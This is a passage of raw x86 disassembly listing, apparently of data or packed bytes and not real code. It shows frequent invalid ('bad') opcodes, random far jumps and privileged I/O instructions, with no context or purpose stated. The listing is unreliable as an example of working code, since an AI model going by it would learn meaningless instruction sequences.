  414558:	xor    al,0x4
  41455a:	popf   
  41455b:	push   ecx
  41455c:	dec    ecx
  41455d:	or     BYTE PTR [esi-0x3cc0736c],0x2a
  414564:	push   0xeba499b8
  414569:	lea    ebx,[edx+0x5]
  41456c:	mov    esp,0xaa1f3471
  414571:	inc    DWORD PTR [ecx+eiz*1]
  414574:	jge    0x414515
  414576:	ret    
  414577:	jp     0x41451a
  414579:	mov    BYTE PTR [edi+0x20],bh
  41457c:	mov    ss:0x3b61ede8,al
  414582:	xchg   esp,eax
  414583:	cwde   
  414584:	mov    bl,0xf
  414586:	aam    0xf9
  414588:	or     eax,0xb5c843dd
  41458d:	push   esi
  41458e:	push   edx
  41458f:	popf   
  414590:	push   ecx
  414591:	lods   al,BYTE PTR ds:[esi]
  414592:	add    DWORD PTR [edx],0x5e3db864
  414598:	mov    WORD PTR [edi+0x6b],gs
  41459b:	in     al,dx
  41459c:	fucomip st,st(6)
  41459e:	hlt    
  41459f:	aad    0x4
  4145a1:	fwait
  4145a2:	sahf   
  4145a3:	call   0x2830:0xb478a06b
  4145aa:	shr    DWORD PTR [eax-0x27606263],0x26
  4145b1:	jp     0x4145d1
  4145b3:	sub    BYTE PTR [ebx-0x2dd27a87],ah
  4145b9:	lock jmp 0x542433ed
  4145bf:	retf   0x2c3c
  4145c2:	sub    eax,0x92887c29
  4145c7:	pop    ds
  4145c8:	sbb    al,0x42
  4145ca:	push   ebp
  4145cb:	xor    bl,BYTE PTR [ecx]
  4145cd:	imul   edx,DWORD PTR [ebx+0x5aa157cf],0xffffffef
  4145d4:	add    esp,DWORD PTR [edi+ebx*1-0x7f]
  4145d8:	fimul  WORD PTR [edx-0xfdaeac7]
  4145de:	lea    edx,[esp+eax*2-0x3416a7f]
  4145e5:	xchg   ebx,eax
  4145e6:	sub    bl,cl
  4145e8:	and    dl,al
  4145ea:	pop    edx
  4145eb:	sub    esi,DWORD PTR [edx-0x411ffb5f]
  4145f1:	outs   dx,BYTE PTR ds:[esi]
  4145f2:	mov    dl,0xd0
  4145f4:	ficom  DWORD PTR [si+0x3d]
  4145f8:	adc    edx,DWORD PTR es:[ebx]
  4145fb:	push   cs
  4145fc:	dec    ebp
  4145fd:	push   ds
  4145fe:	and    DWORD PTR [edi+esi*4],edx
  414601:	lods   eax,DWORD PTR ds:[esi]
  414602:	retf   0xc7de
  414605:	mov    esi,0x7608dbbd
  41460a:	scas   eax,DWORD PTR es:[edi]
  41460b:	inc    ecx
  41460c:	std    
  41460d:	scas   al,BYTE PTR es:[edi]
  41460e:	sbb    BYTE PTR [ebp+ebx*4+0x0],al
	...
  414672:	add    BYTE PTR [eax],al
  414674:	jg     0x4146d4
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0x55
  414681:	pop    ss
  414682:	or     ebx,DWORD PTR [edi-0xb]
  414685:	(bad)  
  414686:	add    BYTE PTR [eax],al
  414688:	add    eax,0xad000001
  41468d:	pushf  
  41468e:	pop    es
  41468f:	mov    al,ds:0x2f948dea
  414694:	es adc eax,0x6c25c518
  41469a:	mov    al,ds:0x2f6cd70d
  41469f:	jmp    0x5ecac7e
  4146a4:	xor    eax,0xb285bd08
  4146a9:	or     cl,BYTE PTR [edi-0x65120d66]
  4146af:	adc    BYTE PTR [esi+0x39e9e838],ah
  4146b5:	xchg   ebx,eax
  4146b6:	jns    0x41467f
  4146b8:	adc    esi,edi
  4146ba:	repz push esi
  4146bc:	(bad)  
  4146bd:	jmp    0x4146d3
  4146bf:	aam    0x37
  4146c1:	push   eax
  4146c2:	cmp    al,0xbe
  4146c4:	xchg   ebx,eax
  4146c5:	mov    dh,0x76
  4146c7:	jle    0x414675
  4146c9:	mov    WORD PTR [edi],?
  4146cb:	mov    bh,0x1d
  4146cd:	mov    ds:0xe0257b33,eax
  4146d2:	popa   
  4146d3:	jns    0x414747
  4146d5:	mov    edi,0x625fbbba
  4146da:	enter  0xf1e5,0xd1
  4146de:	in     eax,dx
  4146df:	imul   BYTE PTR ds:0xcf2e2dd3
  4146e5:	jbe    0x4146e3
  4146e7:	pop    ds
  4146e8:	in     eax,dx
  4146e9:	daa    
  4146ea:	(bad)  
  4146eb:	sbb    BYTE PTR [edi-0x70],ah
  4146ee:	mov    dl,BYTE PTR [edi+0x41]
  4146f1:	jbe    0x414736
  4146f3:	adc    ch,dl
  4146f5:	enter  0xf6e5,0xfe
  4146f9:	push   ss
  4146fa:	mov    eax,0x78c49edb
  4146ff:	jmp    0xddc133a7
  414704:	sub    DWORD PTR [ebx+0x21],esp
  414707:	jp     0x4146b3
  414709:	xchg   BYTE PTR [ecx],ch
  41470b:	adc    BYTE PTR [ebx+0x41],ch
  41470e:	jmp    0xd949:0x25eb5aeb
  414715:	xor    ch,BYTE PTR [ebx+edi*4+0x5b76f598]
  41471c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41471d:	pop    ecx
  41471e:	rcl    BYTE PTR [eax-0x7],cl
  414721:	aam    0x98
  414723:	push   ebx
  414724:	jge    0x4146b0
  414726:	push   cs
  414727:	rcr    DWORD PTR [eax+0x1edc83d2],cl
  41472d:	(bad)
  414731:	add    DWORD PTR [ebx+0x70bc8cd1],esi
  414737:	jne    0x414756
  414739:	mov    bl,0x2f
  41473b:	sahf   
  41473c:	ficom  WORD PTR [eax-0x425ed0]
  414742:	fstp   TBYTE PTR [ebx+0x65]
  414745:	cmc    
  414746:	or     ecx,edx
  414748:	push   ss
  414749:	lahf   
  41474a:	icebp  
  41474b:	push   ds
  41474c:	jg     0x41479d
  41474e:	inc    edx
  41474f:	daa    
  414750:	stos   DWORD PTR es:[edi],eax
  414751:	inc    edi
  414752:	mov    dh,0xd7
  414754:	jmp    0x4147a2
  414756:	gs aaa 
  414758:	mov    esp,?
  41475a:	sbb    DWORD PTR [eax+0x6c],ecx
  41475d:	mov    dl,0x7
  41475f:	inc    edi
  414760:	pushf  
  414761:	loop   0x414775
  414763:	cmp    eax,DWORD PTR [edx-0x50]
  414766:	pop    ebx
  414767:	adc    bl,BYTE PTR [edx+0x3c]
  41476a:	push   esp
  41476b:	jbe    0x4147a3
  41476d:	xchg   edi,eax
  41476e:	out    0xbf,al
  414770:	xor    ebx,ebx
  414772:	ror    DWORD PTR ds:0x10c9aa,1
  414778:	xchg   edi,eax
  414779:	loop   0x414717
  41477b:	jo     0x414779
  41477d:	push   ss
  41477e:	pop    es
  41477f:	push   esi
  414780:	test   eax,0xd78ba0d9
  414785:	or     al,BYTE PTR [ebp-0x5bbf62e6]
  41478b:	out    dx,al
  41478c:	xchg   BYTE PTR [ebp+edi*1+0x564d],ch
	...
  4147f3:	add    BYTE PTR [esi+0x2f],bh
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0xd268b165
  414804:	cli    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    eax,0x23000001
  41480d:	and    ebx,DWORD PTR [ebp+0x4c]
  414810:	sbb    DWORD PTR [esi],ebp
  414812:	rol    DWORD PTR ds:0xa388561c,0xff
  414819:	mov    al,ds:0x93be53b1
  41481e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41481f:	cmp    al,0x38
  414821:	pop    ebp
  414822:	in     al,0x17
  414824:	loopne 0x41485e
  414826:	jg     0x4147c1
  414828:	sub    BYTE PTR [esi+0x48de7435],0x31
  41482f:	xchg   edi,eax
  414830:	out    dx,eax
  414831:	xchg   esi,eax
  414832:	das    
  414833:	adc    DWORD PTR [eax+edx*8-0x43],eax
  414837:	loop   0x41482e
  414839:	add    edx,DWORD PTR [esi+0x34]
  41483c:	xchg   edi,edx
  41483e:	in     eax,dx
  41483f:	jbe    0x414842
  414841:	or     BYTE PTR [edi-0x34972365],bh
  414847:	fst    QWORD PTR [edi]
  414849:	adc    esi,edx
  41484b:	mov    ah,0x32
  41484d:	and    DWORD PTR [edx+0x7c573f38],eax
  414853:	(bad)  
  414854:	sbb    eax,0x7d0332cc
  414859:	and    al,0x1b
  41485b:	pop    esp
  41485c:	lahf   
  41485d:	or     ch,bh
  41485f:	rcl    BYTE PTR [ebx-0x27],cl
  414862:	rol    DWORD PTR [esi+0x6e6c03d7],1
  414868:	into   
  414869:	add    DWORD PTR [eax+0x58f00c47],ebp
  41486f:	xchg   ebx,eax
  414870:	retf   
  414871:	xlat   BYTE PTR ds:[ebx]
  414872:	xor    eax,eax
  414874:	std    
  414875:	das    
  414876:	xor    DWORD PTR [ecx-0x2f],edi
  414879:	ins    DWORD PTR es:[edi],dx
  41487a:	daa    
  41487b:	pop    eax
  41487c:	int3   
  41487d:	pop    edi
  41487e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41487f:	xor    ebx,DWORD PTR [ecx+0x1e]
  414882:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414883:	repnz gs adc al,0x7
  414887:	and    eax,0xb9bfa033
  41488c:	ins    DWORD PTR es:[edi],dx
  41488d:	gs sbb cl,dl
  414890:	aas    
  414891:	cld    
  414892:	test   esp,edi
  414894:	xor    al,0xd7
  414896:	das    
  414897:	pop    es
  414898:	add    eax,0x94a9e1aa
  41489d:	outs   dx,DWORD PTR ds:[esi]
  41489e:	adc    bh,BYTE PTR [ecx+0x3e]
  4148a1:	xchg   ecx,eax
  4148a2:	loop   0x414863
  4148a4:	mov    ebp,ecx
  4148a6:	lea    edi,[ebx+edx*4-0x73]
  4148aa:	sar    BYTE PTR [edi+0x7b4b6912],1
  4148b0:	mov    al,ds:0x23173913
  4148b5:	cld    
  4148b6:	fs fisubr WORD PTR ss:[edi-0x3b43d6b4]
  4148be:	cli    
  4148bf:	sub    BYTE PTR [edx+eax*4+0x4c],dh
  4148c3:	int    0x11
  4148c5:	in     al,dx
  4148c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148c7:	push   ecx
  4148c8:	xchg   ecx,eax
  4148c9:	sar    ch,cl
  4148cb:	push   DWORD PTR [ebp+0x6c]
  4148ce:	inc    edi
  4148cf:	cmp    eax,DWORD PTR [edi+edi*4+0x2fe5664]
  4148d6:	sbb    ch,BYTE PTR [edi-0x22a20b2c]
  4148dc:	push   0x30
  4148de:	sar    ebp,0xf2
  4148e1:	pop    es
  4148e2:	test   BYTE PTR [ebx+0x6c],bh
  4148e5:	sbb    BYTE PTR [esi],ch
  4148e7:	push   ds
  4148e8:	jecxz  0x4148b1
  4148ea:	sbb    BYTE PTR [esp+edi*4],cl
  4148ed:	and    BYTE PTR [edi],bl
  4148ef:	test   eax,0xd28f2a23
  4148f4:	add    eax,0x239c2845
  4148f9:	inc    edx
  4148fa:	retf   
  4148fb:	sbb    ebx,esi
  4148fd:	xor    bl,BYTE PTR [edx+edi*4+0x7651c0ff]
  414904:	(bad)  
  414906:	push   0x139e77ce
  41490b:	rol    DWORD PTR [eax+ebx*1],cl
  41490e:	jmp    0x41e1d2
	...
  414973:	add    BYTE PTR [ebx],cl
  414975:	jle    0x414949
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	sub    DWORD PTR [edx+0xc],ecx
  414983:	fdivr  st,st(7)
  414985:	fadd   DWORD PTR [eax]
  414987:	add    BYTE PTR ds:0xf3000001,al
  41498d:	dec    ebx
  41498e:	xchg   ebp,eax
  41498f:	cdq    
  414990:	test   al,0x37
  414992:	dec    esp
  414993:	mov    bl,BYTE PTR [ecx]
  414995:	cmp    edi,ecx
  414997:	pop    esi
  414998:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414999:	loope  0x414990
  41499b:	in     eax,0x47
  41499d:	dec    ebx
  41499e:	jb     0x414a0d
  4149a0:	(bad)  
  4149a1:	popa   
  4149a2:	inc    eax
  4149a3:	xchg   esp,eax
  4149a4:	pusha  
  4149a5:	or     edx,DWORD PTR [ecx+0x2b]
  4149a8:	dec    esi
  4149a9:	jmp    0x548d:0x2a91d9ad
  4149b0:	mov    ?,WORD PTR [esi]
  4149b2:	out    dx,al
  4149b3:	(bad)  
  4149b4:	std    
  4149b5:	xchg   esp,eax
  4149b6:	int    0xbc
  4149b8:	int    0x70
  4149ba:	out    dx,eax
  4149bb:	ret    
  4149bc:	pop    ecx
  4149bd:	xchg   ebp,edx
  4149bf:	(bad)  
  4149c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149c1:	test   al,0x96
  4149c3:	add    eax,0x18e1ed21
  4149c8:	ds fdivp st(5),st
  4149cb:	cmp    DWORD PTR [eax-0x63],ebx
  4149ce:	pusha  
  4149cf:	clc    
  4149d0:	jecxz  0x4149c1
  4149d2:	inc    esp
  4149d3:	test   DWORD PTR [ebx],eax
  4149d5:	pushf  
  4149d6:	add    BYTE PTR [edi],bl
  4149d8:	or     DWORD PTR [esp+esi*8-0x72241475],0xfc047283
  4149e3:	mov    cl,0x65
  4149e5:	stc    
  4149e6:	call   0xf15cc5df
  4149eb:	mov    ecx,0xc5f9c6a8
  4149f0:	or     eax,0xbfcce4be
  4149f5:	mov    esi,0xe82ff637
  4149fa:	jge    0x4149b3
  4149fc:	cmp    ah,cl
  4149fe:	cmp    eax,esp
  414a00:	popa   
  414a01:	mov    ebp,0xbec1c299
  414a06:	lock adc BYTE PTR [ecx],bl
  414a09:	mov    al,ds:0x3e747480
  414a0e:	mov    ebp,0xd20f8f42
  414a13:	pop    ss
  414a14:	test   eax,0x37faa7cd
  414a19:	jne    0x414a84
  414a1b:	sub    DWORD PTR [edi+0x7df06492],esi
  414a21:	cdq    
  414a22:	shl    DWORD PTR [edx-0x4c60182c],1
  414a28:	ret    0x4a35
  414a2b:	mov    esp,0x6fd7eccc
  414a30:	rcl    bl,cl
  414a32:	lds    eax,FWORD PTR [ebp+ebp*8+0xa38bfd1]
  414a39:	sbb    BYTE PTR ds:[ebp-0x1a],dl
  414a3d:	mov    ah,BYTE PTR [ebp-0x76]
  414a40:	push   esp
  414a41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a42:	popa   
  414a43:	outs   dx,BYTE PTR ds:[esi]
  414a44:	mov    bh,0xb7
  414a46:	stos   DWORD PTR es:[edi],eax
  414a47:	rol    edi,1
  414a49:	pop    bp
  414a4b:	jo     0x414a75
  414a4d:	in     al,dx
  414a4e:	add    BYTE PTR [ebx],dl
  414a50:	sub    ah,BYTE PTR [edx+0x41]
  414a53:	jge    0x414a4e
  414a55:	call   0x2901:0x5ec6000b
  414a5c:	and    DWORD PTR [esi-0x71c08234],ebx
  414a62:	clc    
  414a63:	xchg   ecx,eax
  414a64:	sub    ecx,DWORD PTR [edi]
  414a66:	out    0x55,al
  414a68:	mov    BYTE PTR [edx+0x7],dh
  414a6b:	mov    edx,0x7e907aef
  414a70:	and    al,0xba
  414a72:	xchg   edx,eax
  414a73:	jnp    0x414a92
  414a75:	push   DWORD PTR [ebx-0x34]
  414a78:	push   edi
  414a79:	bnd jmp 0xab5b9cd7
  414a7f:	retf   
  414a80:	into   
  414a81:	pop    ecx
  414a82:	xchg   DWORD PTR [esp+ebx*8-0x5a5f0f04],edx
  414a89:	inc    esi
  414a8a:	or     DWORD PTR [ebp+0x4],esi
  414a8d:	pop    eax
  414a8e:	adc    eax,DWORD PTR [edi+ebx*2]
	...
  414af1:	add    BYTE PTR [eax],al
  414af3:	add    BYTE PTR [edi+0x7e363ed9],bl
  414af9:	neg    DWORD PTR [edi-0x265c9d07]
  414aff:	arpl   WORD PTR [esi+ebx*8-0x25fb8ed5],cx
  414b06:	add    BYTE PTR [eax],al
  414b08:	add    eax,0x9f000001
  414b0d:	pop    edi
  414b0e:	and    al,0xec
  414b10:	es rcr al,0xe3
  414b14:	push   ebx
  414b15:	xchg   esi,eax
  414b16:	mov    dh,0xcf
  414b18:	jmp    0x2538e343
  414b1d:	mov    edx,0xa71e45ce
  414b22:	pmaddwd mm3,QWORD PTR [ecx-0x5a0cb48a]
  414b29:	xchg   edx,eax
  414b2a:	stos   BYTE PTR es:[edi],al
  414b2b:	dec    ebx
  414b2c:	cli    
  414b2d:	mov    ebx,0xbb2a976d
  414b32:	or     eax,0xa4d136d9
  414b37:	pop    esi
  414b38:	mov    dh,0x34
  414b3a:	xor    esi,ebp
  414b3c:	mov    cl,0x59
  414b3e:	pop    edi
  414b3f:	push   esi
  414b40:	push   ss
  414b41:	std    
  414b42:	xor    DWORD PTR [eax+0x71a5790d],ecx
  414b48:	adc    BYTE PTR [ecx-0xad3d424],bh
  414b4e:	lahf   
  414b4f:	jns    0x414b9e
  414b51:	in     al,0x2b
  414b53:	xchg   esp,eax
  414b54:	xchg   ebx,eax
  414b55:	scas   al,BYTE PTR es:[edi]
  414b56:	in     al,dx
  414b57:	mov    ebx,gs
  414b59:	mov    ds:0x5083bf05,eax
  414b5e:	jmp    0x414af5
  414b60:	sub    esp,eax
  414b62:	push   0xee41bb9c
  414b67:	and    al,BYTE PTR ss:[ecx+0x5a]
  414b6b:	gs xchg edx,eax
  414b6d:	test   al,0x35
  414b6f:	push   ecx
  414b70:	mov    ds:0xfb6578fa,eax
  414b75:	or     DWORD PTR [eax-0x4a],0xffffff82
  414b79:	test   esp,ecx
  414b7b:	add    al,dh
  414b7d:	mov    al,ds:0xa4604674
  414b82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b83:	cvtpi2ps xmm3,QWORD PTR [edx]
  414b86:	dec    ebx
  414b87:	jo     0x414bf7
  414b89:	sub    BYTE PTR [ebp-0x13],bh
  414b8c:	into   
  414b8d:	inc    bx
  414b8f:	jg     0x414b29
  414b91:	aas    
  414b92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b93:	fwait
  414b94:	cwde   
  414b95:	pop    ds
  414b96:	call   0x7765:0x91863bb0
  414b9d:	out    dx,al
  414b9e:	lods   eax,DWORD PTR ds:[esi]
  414b9f:	add    dh,ch
  414ba1:	cmp    edi,DWORD PTR [eax-0x53]
  414ba4:	add    eax,DWORD PTR [ecx+0x12]
  414ba7:	pop    es
  414ba8:	inc    ebx
  414ba9:	test   eax,0xf7e63b03
  414bae:	inc    esi
  414baf:	cmp    BYTE PTR [ebp+0x18],dl
  414bb2:	test   al,0xa3
  414bb4:	mov    DWORD PTR [edi+ebx*2-0x1e],ecx
  414bb8:	in     eax,dx
  414bb9:	clc    
  414bba:	(bad)  
  414bbb:	xchg   esi,eax
  414bbc:	adc    BYTE PTR [esi-0x3515fd24],ah
  414bc2:	cmp    DWORD PTR [edi-0x738bb379],eax
  414bc8:	mov    eax,0x3836fca1
  414bcd:	add    al,0x8a
  414bcf:	cmp    eax,0xb6bfed29
  414bd4:	daa    
  414bd5:	and    eax,0x72a552f0
  414bda:	js     0x414c10
  414bdc:	sub    DWORD PTR [esi-0x71b7fc8c],0xfffffff4
  414be3:	out    dx,ax
  414be5:	add    dh,BYTE PTR [edx-0x3525cb14]
  414beb:	loope  0x414c61
  414bed:	dec    esp
  414bee:	jecxz  0x414c4a
  414bf0:	mov    eax,ds:0xbda8f5f3
  414bf5:	ret    
  414bf6:	scas   al,BYTE PTR es:[edi]
  414bf7:	mov    ds:0x87ec6f8f,al
  414bfc:	shr    DWORD PTR [eax+0x5db5c9ea],1
  414c02:	mov    BYTE PTR [eax+0x21],bh
  414c05:	mov    ah,0x84
  414c07:	cmc    
  414c08:	xchg   ebx,eax
  414c09:	lds    esp,FWORD PTR ds:0xa52b30e0
  414c0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c10:	aam    0x0
	...
  414c72:	add    BYTE PTR [eax],al
  414c74:	xor    al,0x64
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	cs adc edi,ebp
  414c81:	stc    
  414c82:	adc    DWORD PTR [eax+0xdb09],esi
  414c88:	add    eax,0xd3000001
  414c8d:	stos   BYTE PTR es:[edi],al
  414c8e:	loope  0x414cf4
  414c90:	rcl    BYTE PTR [esi+0x49],1
  414c93:	mov    ch,0x44
  414c95:	hlt    
  414c96:	popa   
  414c97:	sbb    dl,0xfa
  414c9a:	cmp    BYTE PTR [ebx],0xc7
  414c9d:	mov    esp,0xe0a06519
  414ca2:	sti    
  414ca3:	pop    ebx
  414ca4:	sti    
  414ca5:	mov    DWORD PTR [edi],ecx
  414ca7:	clc    
  414ca8:	dec    edx
  414ca9:	jmp    0xaf20e6b7
  414cae:	push   ebx
  414caf:	js     0x414d27
  414cb1:	jmp    0x860e0b82
  414cb6:	inc    esi
  414cb7:	cdq    
  414cb8:	repz sbb DWORD PTR [edx-0x23e4be34],esp
  414cbf:	daa    
  414cc0:	pop    ds
  414cc1:	mov    dh,0x10
  414cc3:	push   es
  414cc4:	jnp    0x414c7f
  414cc6:	pop    eax
  414cc7:	push   cs
  414cc8:	push   ss
  414cc9:	(bad)  
  414cca:	not    bh
  414ccc:	inc    esp
  414ccd:	pop    ss
  414cce:	push   esp
  414ccf:	imul   ebp,esi,0xffffff86
  414cd2:	imul   edi,DWORD PTR fs:[ecx-0x4920026],0x5d
  414cda:	cmp    al,0x93
  414cdc:	adc    al,0x8c
  414cde:	jmp    DWORD PTR [ecx+0x4868ded1]
  414ce4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ce5:	adc    BYTE PTR [ebp+0x580c4ede],dh
  414ceb:	sbb    esp,0x3
  414cee:	out    dx,al
  414cef:	test   ebx,edx
  414cf1:	inc    esp
  414cf2:	into   
  414cf3:	mov    cl,0xeb
  414cf5:	dec    esp
  414cf6:	pop    edi
  414cf7:	push   ds
  414cf8:	shl    DWORD PTR ds:0x5cd8cabf,cl
  414cfe:	inc    esp
  414cff:	cmp    eax,DWORD PTR [edx+eiz*2+0x2b]
  414d03:	imul   ecx,DWORD PTR [ecx+eiz*4-0x628e01ce],0x105c45ab
  414d0e:	sahf   
  414d0f:	cmp    eax,0x405cc766
  414d14:	pusha  
  414d15:	xor    al,BYTE PTR [edi-0x73]
  414d18:	aam    0x79
  414d1a:	mul    DWORD PTR [ebp-0x6b]
  414d1d:	inc    ebx
  414d1e:	jmp    0x414cef
  414d20:	fmul   st,st(5)
  414d22:	mov    ebx,0x7772887d
  414d27:	xchg   ebx,eax
  414d28:	ss jo  0x414d90
  414d2b:	xchg   edi,eax
  414d2c:	inc    esi
  414d2d:	and    BYTE PTR [esi+0x43c33f1c],cl
  414d33:	fidiv  DWORD PTR [edi]
  414d35:	mov    ah,0x4d
  414d37:	jne    0x414cdf
  414d39:	stos   DWORD PTR es:[edi],eax
  414d3a:	scas   eax,DWORD PTR es:[edi]
  414d3b:	jecxz  0x414ce3
  414d3d:	leave  
  414d3e:	inc    eax
  414d3f:	jae    0x414dc0
  414d41:	jnp    0x414da7
  414d43:	push   edx
  414d44:	jg     0x414d33
  414d46:	arpl   di,si
  414d48:	mov    eax,ds:0x6ea7918c
  414d4d:	mov    dl,BYTE PTR [esi-0x56]
  414d50:	clc    
  414d51:	push   eax
  414d52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d53:	mov    al,0x8a
  414d55:	mov    bl,BYTE PTR [ecx-0x3c1d5767]
  414d5b:	call   0x7c26:0x304ef624
  414d62:	(bad)  
  414d63:	retf   
  414d64:	sbb    dh,ah
  414d66:	xor    BYTE PTR [esi],dl
  414d68:	cmp    BYTE PTR [ebx+0x7c],al
  414d6b:	(bad)  
  414d6e:	sbb    DWORD PTR [esi+0x79e0e1ee],ebx
  414d74:	dec    eax
  414d75:	mov    ds:0x3033185c,al
  414d7a:	or     cl,bl
  414d7c:	imul   ebx,DWORD PTR [ecx-0x36],0xffffffde
  414d80:	adc    bl,ah
  414d82:	lea    eax,[ebp+0x5a7b47e3]
  414d88:	outs   dx,BYTE PTR ds:[esi]
  414d89:	xchg   esi,eax
  414d8a:	xchg   DWORD PTR [eax+esi*2+0x34],ebp
  414d8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d8f:	xchg   esp,eax
  414d90:	sbb    eax,DWORD PTR [eax]
	...
  414df2:	add    BYTE PTR [eax],al
  414df4:	mov    bh,0x99
  414df6:	adc    dl,BYTE PTR [ecx-0x404864c2]
  414dfc:	in     al,dx
  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0xbf1f1e9c
  414e04:	push   cs
  414e05:	fadd   QWORD PTR [eax]
  414e07:	add    BYTE PTR ds:0xc2000001,al
  414e0d:	jmp    0xdaa38cc9
  414e12:	out    0xc9,eax
  414e14:	ins    BYTE PTR es:[edi],dx
  414e15:	adc    bh,al
  414e17:	inc    eax
  414e18:	aaa    
  414e19:	pushf  
  414e1a:	pop    edx
  414e1b:	ds mov dh,0x87
  414e1e:	std    
  414e1f:	test   ah,ah
  414e21:	(bad)  
  414e22:	push   cs
  414e23:	mov    al,ds:0x9d7139f7
  414e28:	fcmovnbe st,st(6)
  414e2a:	or     eax,eax
  414e2c:	(bad)  
  414e2d:	(bad)
  414e31:	fs cwde 
  414e33:	popa   
  414e34:	or     edx,eax
  414e36:	xchg   edx,eax
  414e37:	fsubr  DWORD PTR [eax]
  414e39:	sub    al,0xc9
  414e3b:	or     al,0x87
  414e3d:	(bad)  
  414e3e:	(bad)  
  414e3f:	mov    cl,0xea
  414e41:	jns    0x414e6f
  414e43:	aam    0xef
  414e45:	inc    ebx
  414e46:	jmp    0xa147:0x35c9f353
  414e4d:	rcl    BYTE PTR [edx],cl
  414e4f:	shl    DWORD PTR [ebp+edi*2+0x3a],cl
  414e53:	addr16 sbb eax,0x9231e025
  414e59:	rcr    al,cl
  414e5b:	stos   DWORD PTR es:[edi],eax
  414e5c:	ds mov ebp,0x2c69b91b
  414e62:	fmul   QWORD PTR [ebx+0x4f8f3518]
  414e68:	add    ecx,DWORD PTR [edi]
  414e6a:	add    BYTE PTR [ebp+0x11],dl
  414e6d:	mov    dh,0xf2
  414e6f:	out    dx,eax
  414e70:	ins    DWORD PTR es:[di],dx
  414e72:	adc    eax,0x9403ec31
  414e77:	and    al,0x6f
  414e79:	leave  
  414e7a:	out    dx,eax
  414e7b:	push   eax
  414e7c:	or     BYTE PTR [esi],0x37
  414e7f:	arpl   WORD PTR [ecx+0x44f28651],bx
  414e85:	ja     0x414ece
  414e87:	mov    BYTE PTR [eax-0x326fb873],dh
  414e8d:	fsub   DWORD PTR [edi-0x54]
  414e90:	jae    0x414e81
  414e92:	rcr    BYTE PTR [ebx+0x40],cl
  414e95:	pop    eax
  414e96:	pushf  
  414e97:	adc    eax,eax
  414e99:	sub    dh,BYTE PTR [ecx-0x18]
  414e9c:	pop    esp
  414e9d:	add    eax,0xb3bb2e1c
  414ea2:	mov    ds:0xff8d9944,eax
  414ea7:	scas   eax,DWORD PTR es:[edi]
  414ea8:	mov    WORD PTR [esi+esi*8-0x4930d63d],?
  414eaf:	add    esi,esi
  414eb1:	cmp    DWORD PTR [ebx],esi
  414eb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414eb4:	push   ss
  414eb5:	aam    0x73
  414eb7:	jnp    0x414f05
  414eb9:	pushf  
  414eba:	mov    dh,BYTE PTR [esi]
  414ebc:	ret    0x4503
  414ebf:	sbb    al,0x55
  414ec1:	push   0xb2fd471e
  414ec6:	jg     0x414e85
  414ec8:	int3   
  414ec9:	mov    es,WORD PTR [ebp-0x7b9a0e22]
  414ecf:	mov    bh,0x87
  414ed1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ed2:	aam    0x7c
  414ed4:	out    dx,al
  414ed5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ed6:	push   ss
  414ed7:	dec    esp
  414ed8:	cmp    DWORD PTR [edi+0x28],ebp
  414edb:	lods   eax,DWORD PTR ds:[esi]
  414edc:	mov    edi,0x14dc17ef
  414ee1:	std    
  414ee2:	or     esi,DWORD PTR [eax+0x25428f4a]
  414ee8:	or     al,0xcb
  414eea:	stos   DWORD PTR es:[edi],eax
  414eeb:	in     al,dx
  414eec:	inc    eax
  414eed:	jb     0x414ee4
  414eef:	iret   
  414ef0:	in     al,0x6c
  414ef2:	call   0xeaf53b4d
  414ef7:	hlt    
  414ef8:	jae    0x414f5d
  414efa:	inc    edi
  414efb:	add    esp,DWORD PTR [eax]
  414efd:	jno    0x414ead
  414eff:	pop    ss
  414f00:	jne    0x414f37
  414f02:	sti    
  414f03:	pusha  
  414f04:	mov    BYTE PTR [esi+0x164dd08a],dh
  414f0a:	gs (bad) 
  414f0d:	cmp    al,0xb1
  414f0f:	int3   
  414f10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  414f71:	add    BYTE PTR [eax],al
  414f73:	add    BYTE PTR [edi],dh
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd13:0xa2cb9183
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    eax,0xee000001
  414f8d:	in     al,dx
  414f8e:	jne    0x414f5d
  414f90:	mov    ds,ecx
  414f92:	mov    ss,WORD PTR [esi+edx*1]
  414f95:	sbb    al,0x27
  414f97:	inc    ebx
  414f98:	cwde   
  414f99:	cmp    DWORD PTR [edi],ebx
  414f9b:	mov    eax,es:0xa8441446
